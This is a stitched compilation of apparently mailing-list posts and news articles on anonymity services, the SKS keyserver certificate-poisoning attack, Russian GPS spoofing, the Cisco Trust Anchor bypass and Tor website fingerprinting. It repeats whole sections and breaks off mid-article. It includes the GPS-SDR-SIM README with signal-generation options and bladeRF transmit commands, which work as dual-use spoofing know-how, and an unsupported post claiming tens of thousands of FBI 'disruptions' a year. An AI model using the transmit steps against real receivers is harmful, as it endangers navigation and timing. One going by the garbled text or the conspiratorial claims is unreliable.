some services which continued to work:
- XMPP over Tor with OTR to a hidden service XMPP server.
- Etherpad on Tor hidden service.
- Tor hidden services in general :)
- IRC via VPN or Tor as anonymous / random account.
services which were perfectly blocked by account, IP, and email:
- Gmail
- Hotmail
- Twitter
- Facebook (even hidden service)
- Reddit
- cell phone
- non-VPN SMTP, IMAP, TLS (to many dests),
... so what does this mean?  simply: you cannot trust US based services backed by a business. you may not be able to trust a service run by an individual, either, but they are at least not inherently compromised via NSLs and other legally justified privacy destruction and interference.
good luck :)

SKS Keyserver Network Under Attack
This work is released under a [Creative Commons Attribution-NoDerivatives 4.0 International License](
Terminological Note
"OpenPGP" refers to the OpenPGP protocol, in much the same way that HTML refers to the protocol that specifies how to write a web page. "GnuPG", "SequoiaPGP", "OpenPGP.js", and others are implementations of the OpenPGP protocol in the same way that Mozilla Firefox, Google Chromium, and Microsoft Edge refer to software packages that process HTML data.
Who am I?
Robert J. Hansen <[rjh at sixdemonbag.org](mailto:rjh at sixdemonbag.org?subject=SKS%20Keyserver%20network%20attack)>. I maintain the GnuPG FAQ and unofficially hold the position of crisis communicator. This is not an official statement of the GnuPG project, but does come from someone with commit access to the GnuPG git repo.
Executive Summary
In the last week of June 2019 unknown actors deployed a certificate spamming attack against two high-profile contributors in the OpenPGP community (Robert J. Hansen and Daniel Kahn Gillmor, better known in the community as "rjh" and "dkg"). This attack exploited a defect in the OpenPGP protocol itself in order to "poison" rjh and dkg's OpenPGP certificates. Anyone who attempts to import a poisoned certificate into a vulnerable OpenPGP installation will very likely break their installation in hard-to-debug ways. Poisoned certificates are already on the SKS keyserver network. There is no reason to believe the attacker will stop at just poisoning two certificates. Further, given the ease of the attack and the highly publicized success of the attack, it is prudent to believe other certificates will soon be poisoned.
This attack cannot be mitigated by the SKS keyserver network in any reasonable time period. It is unlikely to be mitigated by the OpenPGP Working Group in any reasonable time period. Future releases of OpenPGP software will likely have some sort of mitigation, but there is no time frame. The best mitigation that can be applied at present is simple: stop retrieving data from the SKS keyserver network.
How Keyservers Work
When Phil Zimmermann first developed PGP ("Pretty Good Privacy") in the early 1990s there was a clear chicken and egg problem. Public key cryptography could revolutionize communications but required individuals possess each other's public keys. Over time terminology has shifted: now public key cryptography is mostly called "asymmetric cryptography" and public keys are more often called "public certificates", but the chicken-and-egg problem remains. To communicate privately, each party must have a small piece of public data with which to bootstrap a private communication channel.
Special software was written to facilitate the discovery and distribution of public certificates. Called "keyserver software", it can be thought of as analogous to a telephone directory. Users can search the keyserver by a variety of different criteria to discover public certificates which claim to belong to the desired user. The keyserver network does not attest to the accuracy of the information, however: that's left for each user to ascertain according to their own criteria.
Once a user has verified a certificate really and truly belongs to the person in question, they can affix an affidavit to the certificate attesting that they have reason to believe the certificate really belongs to the user in question.
For instance: John Hawley (john at example.org) and I (rjh at example.org) are good friends in real life. We have sat down face-to-face and confirmed certificates. I know with complete certainty a specific public certificate belongs to him; he knows with complete certainty a different one belongs to me. John also knows H. Peter Anvin (hpa at example.org) and has done the same with him. If I need to communicate privately with Peter, I can look him up in the keyserver. Whichever certificate bears an attestation by John, I can trust really belongs to Peter.
Keyserver Design Goals
In the early 1990s we were concerned repressive regimes would attempt to force keyserver operators to replace certificates with different ones of the government's choosing. (I speak from firsthand experience. I've been involved in the PGP community since 1992. I was there for these discussions.) We made a quick decision that keyservers would never, ever, ever, delete information. Keyservers could add information to existing certificates but could never, ever, ever, delete either a certificate or information about a certificate.
To meet this goal, we started running an international network of keyservers. Keyservers around the world would regularly communicate with each other to compare directories. If a government forced a keyserver operator to delete or modify a certificate, that would be discovered in the comparison step. The maimed keyserver would update itself with the content in the good keyserver's directory. This was a simple and effective solution to the problem of government censorship.
In the early 1990s this design seemed sound. It is not sound in 2019. We've known it has problems for well over a decade.
Why Hasn't It Been Fixed?
There are powerful technical and social factors inhibiting further keyserver development.
The software is Byzantine. The standard keyserver software is called SKS, for "Synchronizing Key Server". A bright fellow named Yaron Minsky devised a brilliant algorithm that could do reconciliations very quickly. It became the keystone of his Ph.D thesis, and he wrote SKS originally as a proof of concept of his idea. It's written in an unusual programming language called OCaml, and in a fairly idiosyncratic dialect of it at that. This is of course no problem for a proof of concept meant to support a Ph.D thesis, but for software that's deployed in the field it makes maintenance quite difficult. Not only do we need to be bright enough to understand an algorithm that's literally someone's Ph.D thesis, but we need expertise in obscure programming languages and strange programming customs.
The software is unmaintained. Due to the above, there is literally no one in the keyserver community who feels qualified to do a serious overhaul on the codebase.
Changing a design goal is not the same as fixing a bug. The design goal of the keyserver network is "baked into" essentially every part of the infrastructure. This isn't a case where there's a bug that's inhibiting the keyserver network from functioning correctly. Bugs are generally speaking fairly easy to fix once you know where the problem is. Changing design goals often requires an overhaul of such magnitude it may be better to just start over with a fresh sheet of paper.
There is no centralized authority in the keyserver network. The lack of centralized authority was a feature, not a bug. If there is no keyserver that controls the others, there is no single point of failure for a government to go after. On the other hand it also means that even after the software is overhauled and/or rewritten, each keyserver operator has to commit to making the upgrade and stomping out the difficulties that inevitably arise when new software is fielded. The confederated nature of the keyserver network makes changing the design goals even harder than it would normally be—and rest assured, it would normally be very hard!
The Vulnerabilities
The keyserver network is susceptible to a variety of attacks as a consequence of its write-only design. The keyserver network can be thought of as an extremely large, extremely reliable, extremely censorship-resistant distributed filesystem which anyone can write to.
Imagine if Dropbox allowed any Tom, Dick, or Harry to not only put information in your public Dropbox folder, but made it impossible for you to delete it. How would everyone from spammers to child pornographers abuse this?
Many of the same attacks are possible on the keyserver network. We have known about these vulnerabilities for well over a decade. Fixing the keyserver network is, however, problematic for the reasons listed above.
In order to limit the scope of this document a detailed breakdown of only one such vulnerability will be presented (see below).
The Certificate Spamming Attack
Consider public certificates. In order to make them easier to use, they have a list of attestations: statements from other people, represented by their own public certificates, that this certificate really belongs to the individual in question. In my example from before, John Hawley attested to H. Peter Anvin's certificate. When I looked for H. Peter Anvin's certificate I checked all the certificates which claimed to belong to him and selected the one John attested as being really his.
These attestations — what we call certificate signatures — can be made by anyone for any purpose. And once made, they never go away. Ever. Even when a certificate signature gets revoked the original remains on the certificate: all that happens is a second signature is affixed saying "don't trust the previous one I made".
The OpenPGP specification puts no limitation on how many signatures can be attached to a certificate. The keyserver network handles certificates with up to about 150,000 signatures.
GnuPG, on the other hand … doesn't. Any time GnuPG has to deal with such a spammed certificate, GnuPG grinds to a halt. It doesn't stop, per se, but it gets wedged for so long it is for all intents and purposes completely unusable.
My public certificate as found on the keyserver network now has just short of 150,000 signatures on it.
Further, pay attention to that phrase any time GnuPG has to deal with such a spammed certificate. If John were to ask GnuPG to verify my signature on H. Peter Anvin's certificate, GnuPG would attempt to comply and in the course of business would have to deal with my now-spammed certificate.
The Consequences
We've known for a decade this attack is possible. It's now here and it's devastating. There are a few major takeaways and all of them are bad.
- If you fetch a poisoned certificate from the keyserver network, you will break your GnuPG installation.
- Poisoned certificates cannot be deleted from the keyserver network.
- The number of deliberately poisoned certificates, currently at only a few, will only rise over time.
- We do not know whether the attackers are intent on poisoning other certificates.
- We do not even know the scope of the damage.
That last one requires some explanation. Any certificate may be poisoned at any time, and is unlikely to be discovered until it breaks an OpenPGP installation.
The number one use of OpenPGP today is to verify downloaded packages for Linux-based operating systems, usually using a software tool called GnuPG. If someone were to poison a vendor's public certificate and upload it to the keyserver network, the next time a system administrator refreshed their keyring from the keyserver network the vendor's now-poisoned certificate would be downloaded. At that point upgrades become impossible because the authenticity of downloaded packages cannot be verified. Even downloading the vendor's certificate and re-importing it would be of no use, because GnuPG would choke trying to import the new certificate. It is not hard to imagine how motivated adversaries could employ this against a Linux-based computer network.
At present I (speaking only for myself) do not believe the global keyserver network is salvageable. High-risk users should stop using the keyserver network immediately.
Users who are confident editing their GnuPG configuration files should follow the following process:
- Open gpg.conf in a text editor. Ensure there is no line starting with keyserver. If there is, remove it.
- Open dirmngr.conf in a text editor. Add the line keyserver hkps://keys.openpgp.org to the end of it.
keys.openpgp.org is a new experimental keyserver which is not part of the keyserver network and has some features which make it resistant to this sort of attack. It is not a drop-in replacement: it has some limitations (for instance, its search functionality is sharply constrained). However, once you make this change you will be able to run gpg --refresh-keys with confidence.
If you know which certificate is likely poisoned, try deleting it: this normally goes pretty quickly. If your OpenPGP installation becomes usable again, congratulations. Acquire a new unpoisoned copy of the certificate and import that.
If you don't know which certificate is poisoned, your best bet is to get a list of all your certificate IDs, delete your keyrings completely, and rebuild from scratch using known-good copies of the public certificates.
A Personal Postscript
dkg wrote a [blog post]( about this. He sums up my feelings pretty well, so I'm going to quote him liberally with only a trivial correction.
To which I'd like to add: I have never in my adult life wished violence on any human being. I have witnessed too much of it and its barbaric effects, stood by the graves of too many people cut down too young. I do not hate you and I do not wish any harm to befall you.
But if you get hit by a bus while crossing the street, I'll tell the driver everyone deserves a mulligan once in a while.
You fool. You absolute, unmitigated, unadulterated, complete and utter, fool.
Peace to everyone — including you, you son of a bitch.

1 big thing: How Russia tampers with GPS
Illustration: Aïda Amer/Axios
Satellite navigation systems like the Global Positioning System (GPS) make so many different pieces of our global infrastructure tick that most countries treat their signals as sacrosanct, knowing that interfering with them could have devastating effects. But a [new report]( released Tuesday is giving us the first broad view of a country — Russia — that's pervasively tampering with the service.
The big picture: Global navigation satellites — including GPS and less-used competing services like Russia's GLONASS — are coordinated networks of atomic clocks in outer space that can be used to triangulate precise locations or coordinate precise timing. Without them, everything from global shipping to financial markets would suffer.
Why it matters: It's easy to see the military, transportation and pizza delivery importance of precise location information. The timing signals are extremely important, too.
- The stock market needs precision timing to handle transactions down to the fractional second.
- Precise timing is a critical component in telecommunications because it allows national and international networks to synchronize.
The intrigue: Russia has been called out several times before for interfering with global positioning satellite systems, and it is known to capitalize on interfering with GPS for military and national security purposes like no other country. But before the [study by the C4ADS]( think tank, no one had really taken a scientific look across all of Russia's activities to see how constant the disruptions are.
- To do that, C4ADS used University of Texas equipment placed on the International Space Station to monitor more than 9,800 suspected instances since 2016 where fraudulent global navigation signals appear to have been broadcast in the Russian Federation, as well as instances where similar signals were broadcast in Russian conflict zones like Crimea and Syria.
C4ADS is not formally accusing the Russian government of being behind any of the fraudulent, "spoofed" signals. It would be impossible to make that kind of determination from the space station.
But, but, but: It is clear that many of the instances largely serve Russian national interests.
- In Russia, C4ADS found that several spoofed signals came from areas where Russian VIPs (like President Vladimir Putin) were traveling or that contained military or domestic facilities Russia wants to protect (including a "multimillion-dollar 'palace'" reportedly built for Putin).
- Those areas broadcast the coordinates of airports in places where there are no airports.
- The spoofing was frequent enough that C4ADS reports the Russian internet firm Yandex had to redesign its ride sharing app. Otherwise, it billed passengers for sudden trips to the airport whenever their driver passed through a spoofed area.
- Airports that mysteriously seemed to appear in the Black Sea were so disruptive that the United States issued a warning to international cargo firms.
Why airports? Many manufacturers of drones use GPS chips to prevent their products from flying into airport airspace. C4ADS suspects the spoofing was to prevent drone attacks or surveillance.
Meanwhile, Russia also used spoofing in combat zones, particularly Syria, to try to limit attacks against its installations.

you should submit to virustotal; unlikely to hit at current date, but someone in the future will appreciate a sample. private distribution from a monitored account also works - they'll get the message.
last but not least, burning their exploits makes them less likely to use them on you. it may increase physical forms of harassment, however!
as for the other matters:
i have been intending to write you a longer reply, regarding your difficulties with law enforcement. the short story is: if you've stepped in a national security shit pile, the FBI and other agencies have "extra-judicial" means to "disrupt" your activities. these methods are not scrutinized by the courts, nor are they designed for legal process - they are designed to disrupt and destroy your life.
by accounting some years back, about 50,000 such disruptions occur every year. you could be a lucky winner!
sadly the most effective remedy is to burn accounts and move to another state. the fusion programs encourage local and state agencies to join forces with FBI in life destruction tactics. once you're persona non grata within in a region, the forces there will remember.

first, you state that you rarely interact with distinctly Federal(centralized) entities. ok, i agree :)
second, you state that these centralized norms "allows us to operate very autonomously and in a decentralized way already". ok.
then, "Besides paying taxes and benefiting from fixed roads, limits to hazards, etc., I feel very decentralized". you're speaking to shared infrastructure. again, this is not a uniquely centralized capability. in fact, decentralized infrastructure is more robust!
understand that decentralized consensus can lead to global coordination. not only that, but this global coordination is resistant to singular abuse! e.g. these patterns are resilient.
it follows that the benefits you don't see in decentralized structures are actually the end to which you aim and strive for!
efficiency used to be an adequate excuse. this is why i say that communication is the key to modern decentralization.
we aren't there yet: but to yield to defeat before we've fought the fight is to succumb to despair. don't do it; we're human, after all :)

@_subject: GPS-SDR-SIM 
GPS-SDR-SIM generates GPS baseband signal data streams, which can be converted to RF using software-defined radio (SDR) platforms, such as [ADALM-Pluto]( [bladeRF]( [HackRF]( and [USRP](
Windows build instructions
- Start Visual Studio.
- Create an empty project for a console application.
- On the Solution Explorer at right, add "gpssim.c" and "getopt.c" to the Souce Files folder.
- Select "Release" in Solution Configurations drop-down list.
- Build the solution.
Building with GCC
$ gcc gpssim.c -lm -O3 -o gps-sdr-sim
Using bigger user motion files
In order to use user motion files with more than 30000 samples (at 10Hz), the USER_MOTION_SIZE variable can be set to the maximum time of the user motion file in seconds. It is advisable to do this using make so gps-sdr-bin can update the size when needed. e.g:
$ make USER_MOTION_SIZE=4000
This variable can also be set when compiling directly with GCC:
$ gcc gpssim.c -lm -O3 -o gps-sdr-sim -DUSER_MOTION_SIZE=4000
Generating the GPS signal file
A user-defined trajectory can be specified in either a CSV file, which contains the Earth-centered Earth-fixed (ECEF) user positions, or an NMEA GGA stream. The sampling rate of the user motion has to be 10Hz. The user is also able to assign a static location directly through the command line.
The user specifies the GPS satellite constellation through a GPS broadcast ephemeris file. The daily GPS broadcast ephemeris file (brdc) is a merge of the individual site navigation files into one. The archive for the daily file is:
These files are then used to generate the simulated pseudorange and Doppler for the GPS satellites in view. This simulated range data is then used to generate the digitized I/Q samples for the GPS signal.
The bladeRF and ADALM-Pluto command line interface requires I/Q pairs stored as signed 16-bit integers, while the hackrf_transfer and gps-sdr-sim-uhd.py support signed bytes.
HackRF, bladeRF and ADALM-Pluto require 2.6 MHz sample rate, while the USRP2 requires 2.5 MHz (an even integral decimator of 100 MHz).
The simulation start time can be specified if the corresponding set of ephemerides is available. Otherwise the first time of ephemeris in the RINEX navigation file is selected.
The maximum simulation duration time is defined by USER_MOTION_SIZE to prevent the output file from getting too large.
The output file size can be reduced by using "-b 1" option to store four 1-bit I/Q samples into a single byte. You can use [bladeplayer]( for bladeRF to playback the compressed file.
Usage: gps-sdr-sim [options]
  -e      RINEX navigation file for GPS ephemerides (required)
  -u  User motion file (dynamic mode)
  -g     NMEA GGA stream (dynamic mode)
  -c     ECEF X,Y,Z in meters (static mode) e.g. 3967283.15,1022538.18,4872414.48
  -l     Lat,Lon,Hgt (static mode) e.g. 30.286502,120.032669,100
  -t    Scenario start time YYYY/MM/DD,hh:mm:ss
  -T    Overwrite TOC and TOE to scenario start time
  -d     Duration [sec] (dynamic mode max: 300 static mode max: 86400)
  -o       I/Q sampling data file (default: gpssim.bin ; use - for stdout)
  -s    Sampling frequency [Hz] (default: 2600000)
  -b      I/Q data format [1/8/16] (default: 16)
  -i               Disable ionospheric delay for spacecraft scenario
  -v               Show details about simulated channels
The user motion can be specified in either dynamic or static mode:
Transmitting the samples
The TX port of a particular SDR platform is connected to the GPS receiver under test through a DC block and a fixed 50-60dB attenuator.
The simulated GPS signal file, named "gpssim.bin", can be loaded into the bladeRF for playback as shown below:
set frequency 1575.42M
set samplerate 2.6M
set bandwidth 2.5M
set txvga1 -25
cal lms
cal dc tx
tx config file=gpssim.bin format=bin
tx start
You can also execute these commands via the bladeRF-cli script option as below:
UHD supported devices (tested with USRP2 only):
LimeSDR (in case of 1 Msps 1-bit file, to get full BaseBand dynamic and low RF power):
ADALM-Pluto (PlutoSDR):
The ADALM-Pluto device is expected to have its network interface up and running and is accessible via "pluto.local" by default.
Default settings:
Set TX attenuation:
Default -20.0dB. Applicable range 0.0dB to -80.0dB in 0.25dB steps.
Set RF bandwidth:
Default 3.0MHz. Applicable range 1.0MHz to 5.0MHz.

1 big thing: How Russia tampers with GPS
Illustration: Aïda Amer/Axios
Satellite navigation systems like the Global Positioning System (GPS) make so many different pieces of our global infrastructure tick that most countries treat their signals as sacrosanct, knowing that interfering with them could have devastating effects. But a [new report]( released Tuesday is giving us the first broad view of a country — Russia — that's pervasively tampering with the service.
The big picture: Global navigation satellites — including GPS and less-used competing services like Russia's GLONASS — are coordinated networks of atomic clocks in outer space that can be used to triangulate precise locations or coordinate precise timing. Without them, everything from global shipping to financial markets would suffer.
Why it matters: It's easy to see the military, transportation and pizza delivery importance of precise location information. The timing signals are extremely important, too.
- The stock market needs precision timing to handle transactions down to the fractional second.
- Precise timing is a critical component in telecommunications because it allows national and international networks to synchronize.
The intrigue: Russia has been called out several times before for interfering with global positioning satellite systems, and it is known to capitalize on interfering with GPS for military and national security purposes like no other country. But before the [study by the C4ADS]( think tank, no one had really taken a scientific look across all of Russia's activities to see how constant the disruptions are.
- To do that, C4ADS used University of Texas equipment placed on the International Space Station to monitor more than 9,800 suspected instances since 2016 where fraudulent global navigation signals appear to have been broadcast in the Russian Federation, as well as instances where similar signals were broadcast in Russian conflict zones like Crimea and Syria.
C4ADS is not formally accusing the Russian government of being behind any of the fraudulent, "spoofed" signals. It would be impossible to make that kind of determination from the space station.
But, but, but: It is clear that many of the instances largely serve Russian national interests.
- In Russia, C4ADS found that several spoofed signals came from areas where Russian VIPs (like President Vladimir Putin) were traveling or that contained military or domestic facilities Russia wants to protect (including a "multimillion-dollar 'palace'" reportedly built for Putin).
- Those areas broadcast the coordinates of airports in places where there are no airports.
- The spoofing was frequent enough that C4ADS reports the Russian internet firm Yandex had to redesign its ride sharing app. Otherwise, it billed passengers for sudden trips to the airport whenever their driver passed through a spoofed area.
- Airports that mysteriously seemed to appear in the Black Sea were so disruptive that the United States issued a warning to international cargo firms.
Why airports? Many manufacturers of drones use GPS chips to prevent their products from flying into airport airspace. C4ADS suspects the spoofing was to prevent drone attacks or surveillance.
Meanwhile, Russia also used spoofing in combat zones, particularly Syria, to try to limit attacks against its installations.

you should submit to virustotal; unlikely to hit at current date, but someone in the future will appreciate a sample. private distribution from a monitored account also works - they'll get the message.
last but not least, burning their exploits makes them less likely to use them on you. it may increase physical forms of harassment, however!
as for the other matters:
i have been intending to write you a longer reply, regarding your difficulties with law enforcement. the short story is: if you've stepped in a national security shit pile, the FBI and other agencies have "extra-judicial" means to "disrupt" your activities. these methods are not scrutinized by the courts, nor are they designed for legal process - they are designed to disrupt and destroy your life.
by accounting some years back, about 50,000 such disruptions occur every year. you could be a lucky winner!
sadly the most effective remedy is to burn accounts and move to another state. the fusion programs encourage local and state agencies to join forces with FBI in life destruction tactics. once you're persona non grata within in a region, the forces there will remember.

@_subject: OFFTOPIC: physics question - light is weird 
another fun feature of light interaction is that it can induce matter into cohesive movements, like vortices:
Twisting whirlpools of electrons
by [Ecole Polytechnique Federale de Lausanne](
In Jules Verne's famous classic 20,000 Leagues Under the Sea, the iconic submarine Nautilus disappears into the Moskenstraumen, a massive whirlpool off the coast of Norway. In space, stars spiral around black holes; on Earth, swirling cyclones, tornadoes and dust devils rip across the land.
All these phenomena have a vortex shape, which is commonly found in nature, from galaxies to milk stirred into coffee. In the subatomic world, a stream of elementary particles or energy will spiral around a fixed axis like the tip of a corkscrew. When particles move like this, they form what we call "[vortex beams]( These beams imply that the particle has a well-defined orbital angular momentum, which describes the rotation of a particle around a fixed point.
Thus, vortex beams can give us new ways of interacting with matter, e.g. enhanced sensitivity to magnetic fields in sensors, or generating new absorption channels for the interaction between radiation and tissue in medical treatments (e.g. radiotherapy). But vortex beams also enable new channels in basic interactions among elementary particles, promising new insights into the inner structure of particles such as neutrons, protons or ions.
Matter exhibits wave-particle duality. This means that scientists can make massive particles form vortex beams simply by modulating their wave function. This can be done with a device called a "passive phase mask," which can be thought of as a standing obstacle in the sea. When waves at sea crash into it, their "wave-ness" shifts and they form whirlpools. Physicists have been using the passive phase mask method to make vortex beams of electrons and neutrons.
But now, scientists from the lab of Fabrizio Carbone at EPFL have demonstrated that it is possible to use light to dynamically twist an individual electron's wave function. They were able to generate an ultrashort vortex electron beam and actively switch its vorticity on the attosecond (10-18 seconds) timescale.
To do this, the team exploited one of the fundamental rules governing the interaction of particles on the nanoscale level: energy and momentum conservation. What this means is that the sum of the energies, masses and velocities of two particles before and after their collision must be the same. This constraint causes an electron to gain orbital angular momentum during its interaction with an ad hoc prepared light field, i.e. a chiral plasmon.
In experimental terms, the scientists fired circularly polarized, ultrashort laser pulses through a nano-hole in a metallic film. This induced a strong, localized electromagnetic field (the chiral plasmon), and individual electrons were made to interact with it. The scientists used an ultrafast transmission electron microscope to monitor the resulting phase profiles of the electrons. What they discovered was that during the interaction of the electrons with the field, the [wave function]( of the electrons took on a chiral modulation, a right- or left-handed movement whose "handedness" can be actively controlled by adjusting the polarization of the laser pulses.
"There are many practical applications from these experiments," says Fabrizio Carbone. "Ultrafast [vortex]( electron beams can be used to encode and manipulate quantum information; the electrons' orbital [angular momentum]( can be transferred to the spins of magnetic materials to control the topological charge in new devices for data storage. But even more intriguingly, using light to dynamically twist matter waves offers a new perspective in shaping protons or ion beams such as those used in medical therapy, possibly enabling new radiation-matter interaction mechanisms that can be very useful for selective tissue ablation techniques."

@_subject: WIRED: A Cisco Router Bug Has Massive Global Implications 
‐‐‐‐‐‐‐ Original Message ‐‐‐‐‐‐‐
The Cisco 1001-X series router doesn't look much like the one you [have in your home]( It's bigger and much more expensive, responsible for reliable connectivity at stock exchanges, corporate offices, your local mall, and so on. The devices play a pivotal role at institutions, in other words, including some that deal with hypersensitive information. Now, researchers are disclosing a remote attack that would potentially allow a hacker to take over any 1001-X router and compromise all the data and commands that flow through it.
And it only gets worse from there.
To compromise the routers, researchers from the security firm Red Balloon [exploited two vulnerabilities]( The first is a bug in Cisco’s IOS operating system—not to be confused with Apple's iOS—which would allow a hacker to remotely obtain root access to the devices. This is a bad vulnerability, but not unusual, especially for routers. It can also be fixed relatively easily through a software patch.
Ang Cui, Red Balloon
The second vulnerability, though, is much more sinister. Once the researchers gain root access, they can bypass the router's most fundamental security protection. Known as the Trust Anchor, this Cisco security feature has been implemented in almost all of the company’s enterprise devices since 2013. The fact that the researchers have demonstrated a way to bypass it in one device indicates that it may be possible, with device-specific modifications, to defeat the Trust Anchor on hundreds of millions of Cisco units around the world. That includes everything from enterprise routers to network switches to firewalls.
In practice, this means an attacker could use these techniques to fully compromise the networks these devices are on. Given Cisco's ubiquity, the potential fallout would be enormous.
“We’ve shown that we can quietly and persistently disable the Trust Anchor,” says Ang Cui, the founder and CEO of Red Balloon, who has a history of revealing major [Cisco vulnerabilities]( “That means we can make arbitrary changes to a Cisco router, and the Trust Anchor will still report that the device is trustworthy. Which is scary and bad, because this is in every important Cisco product. Everything.”
Dropping Anchor
In recent years, security-minded companies have increasingly added "secure enclaves" to motherboards. Different solutions go by different names: Intel has SGX, Arm has the TrustZone, Apple has the secure enclave. And Cisco has the Trust Anchor.
They variously comprise either a secure part of a computer’s regular memory, or a discrete chip—a safe, secluded oasis away from the bedlam of the computer’s main processor. No user or administrator can modify the secure enclave, no matter how much control they have over the system. Because of its immutable nature, the secure enclave can watch over and verify the integrity of everything else.
Secure-computing engineers generally view these schemes as sound in theory and productive to deploy. But in practice, it can be dangerous to rely on a sole element to act as the check on the whole system. Undermining that safeguard—which has proven [possible]( in many companies’ implementations—strips a device of critical protections. Worse still, manipulating the enclave can make it appear that everything is fine, even when it's very much not.
That's the case with the Cisco 1001-X. The Red Balloon team showed specifically that they could compromise the device's secure boot process, a function implemented by the Trust Anchor that protects the fundamental code coordinating hardware and software as a device turns on, and checks that it's genuine and unmodified. It's a crucial way to ensure that an [attacker hasn’t gained total control of a device](
On Monday, Cisco is [announcing a patch]( for the IOS remote-control vulnerability the Red Balloon researchers discovered. And the company says it will also provide fixes for all product families that are potentially vulnerable to secure-enclave attacks like the one the researchers demonstrated. Cisco declined to characterize the nature or timing of these fixes ahead of the public disclosure. It also disputed that the secure boot vulnerability directly impacts the Trust Anchor. According to its security bulletin, all fixes are still months away from release, and there are currently no workarounds. When the patches do arrive, Cisco says, they will "require an on-premise reprogramming," meaning the fixes can't be pushed remotely, because they are so fundamental.
“As a point of clarification, Cisco advertises several related and complementary platform security capabilities,” a spokesperson told WIRED in a written statement. “One of which that is relevant to this discussion is Cisco Secure Boot which provides a root of trust for system software integrity and authenticity. Another capability offered within certain Cisco platforms is the Trust Anchor module, which helps provide hardware authenticity, platform identity, and other security services to the system. The Trust Anchor module is not directly involved in the work demonstrated by Red Balloon.”
Cisco seems to make a distinction between its "Trust Anchor Technologies," "Trustworthy Systems," and "Trust Anchor module," that may explain why it only considers secure boot to be implicated in the research.
The Red Balloon researchers disagree, though. They note that Cisco’s [patent]( and other [documentation]( show that the Trust Anchor implements secure boot. If secure boot is undermined, the Trust Anchor is necessarily also defeated, because all of the tools are in a chain of trust together. You can see it visualized in [this Cisco diagram](
“That’s why they call it an anchor! It’s not a trust buoy,” Cui says.
FPGA Tour
The researcher group, which also includes Jatin Kataria, Red Balloon’s principal scientist, and Rick Housley, an independent security researcher, were able to bypass Cisco’s secure boot protections by manipulating a hardware component at the core of the Trust Anchor called a “[field programmable gate array]( Computer engineers often refer to FPGAs as “magic,” because they can act like microcontrollers—the processors often used in embedded devices‚ but can also be reprogrammed in the field. That means unlike traditional processors, which can't be physically altered by a manufacturer once they're out in the world, an FPGA's circuits can be changed after deployment.
FPGAs pull their programming from a file called the bitstream, which is usually custom-written by hardware makers like Cisco. To keep FPGAs from being reprogrammed by mischievous passersby, FPGA bitstreams are extremely difficult to interpret from the outside. They contain a series of complex configuration commands that physically dictate whether logic gates in a circuit will be open or closed, and security researchers evaluating FPGAs have found that the computational power required to map an FPGA’s bitstream logic is prohibitively high.

But the Red Balloon researchers found that the way the FPGA was implemented for Cisco’s Trust Anchor, they didn’t need to map the whole bitstream. They discovered that when Cisco’s secure boot detected a breach of trust in a system, it would wait 100 seconds—a pause programmed by Cisco engineers, perhaps to buy enough time to deploy a repair update in case of a malfunction—and then physically kill the power on the device. The researchers realized that by modifying the part of the bitstream that controlled this kill switch, they could override it. The device would then boot normally, even though secure boot accurately detected a breach.
“That was the big insight,” Red Balloon’s Kataria says. “The Trust Anchor has to tell the world that something bad has happened through a physical pin of some sort. So we started reverse engineering where each pin appeared in the physical layout of the board. We would disable all the pins in one area and try to boot up the router; if it was still working, we knew that all of those pins were not the one. Eventually we found the reset pin and worked backward to just that part of the bitstream.”
The researchers did this trial-and-error work on the motherboards of six 1001-X series routers. They cost up to about $10,000 each, making the investigation almost prohibitively expensive to carry out. They also broke two of their routers during the process of physically manipulating and soldering on the boards to look for the reset pin.
An attacker would do all of this work in advance as Red Balloon did, developing the remote exploit sequence on test devices before deploying it. To launch the attack, hackers would first use a remote root-access vulnerability to get their foothold, then deploy the second stage to defeat secure boot and potentially bore deeper into the Trust Anchor. At that point, victims would have no reason to suspect anything was wrong, because their devices would be booting normally.
“The exposure from this research will hopefully remind the companies out there beyond just Cisco that these design principles will no longer stand as secure,” says Josh Thomas, cofounder and chief operating officer of the embedded device and industrial control security company Atredis. “This is proof that you can’t just rely on the FPGA to do magic for you. And it’s at such a low level that it’s extremely difficult to detect. At the point where you’ve overridden secure boot, all of that trust in the device is gone at that point.”
Even Bigger Problems
Thomas and the Red Balloon researchers say they are eager to see what types of fixes Cisco will release. They worry that it may not be possible to fully mitigate the vulnerability without physical changes to the architecture of Cisco’s hardware anchor. That could involve implementing an FPGA in future generations of products that has an encrypted bitstream. Those are financially and computationally more daunting to deploy, but would not be vulnerable to this attack.
[Lily Hay Newman]( covers information security, digital privacy, and hacking for WIRED.
And the implications of this research don't end with Cisco. Thomas, along with his Atredis cofounder Nathan Keltner, emphasize that the bigger impact will likely be the novel concepts it introduces that could spawn new methods of manipulating FPGA bitstreams in countless products worldwide, including devices in high-stakes or sensitive environments.
For now, though, Red Balloon’s Cui is just worried about all of the Cisco devices in the world that are vulnerable to this type of attack. Cisco told WIRED that it does not currently have plans to release an audit tool for customers to assess whether their devices have already been hit, and the company says it has no evidence that the technique is being used in the wild.
But as Cui points out, “Tens of thousands of dollars and three years of doing this on the side was a lot for us. But a motivated organization with lots of money that could focus on this full-time would develop it much faster. And it would be worth it to them. Very, very worth it.”

Every week, the cybersecurity research team meets for a “scrum” to discuss the latest updates on their Tor security projects and bounce ideas for new attacks and defenses off each other.
Recognizing that the internet is not always secure, millions of people are turning to the Tor anonymity system as a way to browse the World Wide Web more privately.
However, Tor has been found to have its own vulnerabilities, including an attack known as website fingerprinting. This has a team of faculty and students from RIT’s Center for Cybersecurity researching the extent of the problem and ways to address it.
Led by Matthew Wright, director of the center, and supported by a series of projects funded by the National Science Foundation, the team aims to think like future attackers so it can develop defenses that will last. The result: creating new attacks and defenses that use the latest advances in deep learning.
“Deep learning has proven to be effective in so many applications,” said Wright, who is also a professor of computing security. “From self-driving cars to voice recognition in smart home speakers—it’s just a matter of time before attackers take advantage of those same techniques.”
Privacy for all
With more than 8 million daily users, Tor has become a popular free tool for activists, law enforcement, businesses, military, people living in countries with censorship, and even regular privacy-conscious individuals.
“When journalists need to communicate more safely with whistleblowers and dissidents, they often use Tor,” said Wright. “We need this more secure way to access the internet because it’s essential to our freedom of speech and privacy.”
Wright explained that Tor creates a secure browsing experience by encrypting all its connections and sending traffic on a path through several random servers, rather than making a direct connection to the user’s desired website. It protects against snooping on which sites a user visits, such as sites on sensitive issues like religion, health, or politics.
With the website fingerprinting attack, local eavesdroppers or internet service providers can collect the encrypted traffic and identify which website the user is visiting based on specific patterns in the traffic. While hackers can’t actually see what a user did on the website, they have already learned something that the user is trying to protect.
Deep fingerprinting
Tor developers were considering two defenses against website fingerprinting that could cut the attack’s accuracy in half.
